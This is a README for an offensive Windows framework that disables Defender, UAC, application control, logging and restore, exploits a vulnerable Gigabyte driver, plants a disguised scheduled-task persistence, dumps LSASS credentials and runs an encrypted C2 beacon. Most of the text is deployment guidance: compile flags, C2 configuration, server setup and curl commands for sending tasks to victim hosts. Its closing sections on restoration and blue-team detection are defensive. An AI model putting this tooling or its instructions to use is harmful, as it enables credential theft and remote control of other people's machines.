Church - Weaponized Windows Security Bypass Framework

<img width="2212" height="532" alt="com" src="https://github.com/user-attachments/assets/9fa365d3-358d-477d-ba77-fadec4d1cab5" />


Repository: https://git.churchofmalware.org/ek0mssavi0r/CHURCH/

This framework is designed for authorized security research, red team operations, and defensive validation testing against modern Windows security controls. Church implements multiple bypass techniques that disable or neutralize Windows Defender, UAC, AppLocker, WDAC, Driver Signature Enforcement (DSE), Protected Process Light (PPL), security event logging, system restore, telemetry, and security services. It includes a persistent C2 beacon with AES-256 encrypted HTTPS communication and command execution capabilities.

## DISCLAIMER FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY.

Church targets the following Windows security layers:

- Windows Defender Tamper Protection via registry ownership takeover
- Defender real-time protection, behavior monitoring, cloud protection, and signature updates
- User Account Control (UAC) via EnableLUA registry modification
- AppLocker and Windows Defender Application Control (WDAC) via service disable and policy deletion
- Driver Signature Enforcement (DSE) via vulnerable driver exploitation (gdrv.sys CVE-2018-19320)
- Process Light (PPL) protection via SeTcbPrivilege elevation and NtSetInformationProcess
- Security event logging via MiniNt registry key
- System restore points and telemetry domains via hosts file modification
- Security services including Sense, SgrmBroker, WdBoot, WdFilter, WdNisDrv, SecurityHealthService, and wscsvc

The framework executes in eight phases: core protection disable, anti-forensics, persistence establishment, service elimination, credential access (LSASS dump), kernel bypass, process protection elevation, and C2 beacon activation.

System Requirements

Target Environment:
- Windows 10 or Windows 11 (any edition)
- Administrator access required
- Test system or authorized target only

Build Environment:
- Visual Studio with C compiler
- Windows SDK
- Windows 10/11 SDK or later

Required External File:
- gdrv.sys (Gigabyte driver, CVE-2018-19320) placed in same directory as the executable

Compilation Instructions

From Visual Studio Developer Command Prompt:

cl /O2 /MT /Fe:church.exe church.c /link advapi32.lib user32.lib wbemuuid.lib ole32.lib crypt32.lib ntdll.lib bcrypt.lib ws2_32.lib winhttp.lib iphlpapi.lib

For production use, consider adding:
- /GS- (disable stack buffer security check for smaller binary)
- /GL (whole program optimization)

Configuration

Edit church.c to configure C2 server settings before compilation:

#define C2_SERVER L"https://your-c2-server.com:443/beacon"
#define C2_INTERVAL_SECONDS 30
#define C2_AES_KEY "ChurchOfMalware2024!!ChurchOfMalware2024!!"
#define C2_AES_IV "MalwareChurchIV!!"

Replace your-c2-server.com with the actual C2 server IP or domain. Ensure the AES key and IV match the C2 server configuration.

C2 Server Deployment

Deploy the Python C2 server on a controlled system with a valid SSL certificate or test certificate:

pip install flask cryptography

python c2_server.py

The server listens on port 443 with ad-hoc SSL. For production red team operations, replace the self-signed certificate with a valid certificate and deploy behind a redirector.

C2 API Endpoints:
- POST /beacon - Receives encrypted beacon data and returns tasks
- POST /task - Accepts new tasks for specific hosts (JSON payload)
- GET /tasks - Lists all pending tasks

Adding Tasks to Victims:

curl -X POST https://c2-server/task -H "Content-Type: application/json" -d '{"host": "TARGET_HOSTNAME", "command": "whoami", "powershell": false}'

curl -X POST https://c2-server/task -H "Content-Type: application/json" -d '{"host": "TARGET_HOSTNAME", "command": "Get-Process", "powershell": true}'

Execution

Run the compiled executable as Administrator. The tool auto-elevates if not already elevated. Monitor console output for phase completion status. The system reboots automatically after completion unless interrupted.

Cleanup and Restoration

After testing, restore the target system using the included restoration script or revert from a snapshot. Manual restoration steps:

Re-enable Defender: sc config WinDefend start= auto & sc start WinDefend
Re-enable UAC: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
Disable MiniNt: reg delete HKLM\SYSTEM\CurrentControlSet\Control\MiniNt /f
Re-enable System Restore: reg add HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore /v DisableSR /t REG_DWORD /d 0 /f
Remove persistence: schtasks /delete /tn "WindowsUpdateTask" /f

Reboot the system after applying these changes.

Detection and Countermeasures

Blue teams can detect Church operations through multiple indicators:

- Registry modifications to HKLM\SOFTWARE\Microsoft\Windows Defender\Features (TamperProtection set to 0)
- Registry ownership changes via SetNamedSecurityInfo calls
- Creation of service gdrv and loading of unsigned driver
- MiniDumpWriteDump calls targeting lsass.exe
- PowerShell commands disabling MpPreference settings
- Creation of scheduled task WindowsUpdateTask
- Process with SeTcbPrivilege elevation attempt via AdjustTokenPrivileges
- Outbound HTTPS beacons on port 443 with specific User-Agent string
- Registry modifications enabling MiniNt or disabling EnableLUA

Recommended defensive measures include:
- Enable Hypervisor-protected Code Integrity (HVCI)
- Deploy Credential Guard to block LSASS dumping
- Monitor Event ID 4657 for registry changes to security keys
- Implement application whitelisting via WDAC in enforce mode
- Use EDR with kernel callbacks for registry and process monitoring
- Enable PowerShell Script Block Logging

## DISCLAIMER FOR AUTHORIZED TESTING AND EDUCATIONAL PURPOSES ONLY.
